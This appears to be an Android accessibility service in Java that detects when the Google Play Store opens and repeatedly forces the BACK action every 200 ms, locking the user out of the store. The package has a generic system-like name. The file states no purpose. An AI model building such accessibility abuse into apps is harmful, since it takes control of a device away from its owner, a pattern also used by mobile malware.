package com.framework.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;

public class PlayStoreBlockerService extends AccessibilityService {

    private static final String EMPTY_STRING = "";
    private static final String PLAY_STORE_PACKAGE = "com.android.vending";
    private static final int RETRY_DELAY_MS = 200;
    private final Handler handler = new Handler();

    private final Runnable retryBlocker = new Runnable() {
        @Override
        public void run() {
            if (PLAY_STORE_PACKAGE.equals(String.valueOf(getActiveWindowPackage()))) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                handler.postDelayed(this, RETRY_DELAY_MS);
            }
        }
    };

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            return;
        }

        if (PLAY_STORE_PACKAGE.equals(String.valueOf(event.getPackageName()))) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            handler.postDelayed(retryBlocker, RETRY_DELAY_MS);
        } else {
            handler.removeCallbacks(retryBlocker);
        }
    }

    @Override
    public void onInterrupt() {
        handler.removeCallbacks(retryBlocker);
    }

    private CharSequence getActiveWindowPackage() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        return (rootNode != null) ? rootNode.getPackageName() : EMPTY_STRING;
    }
}
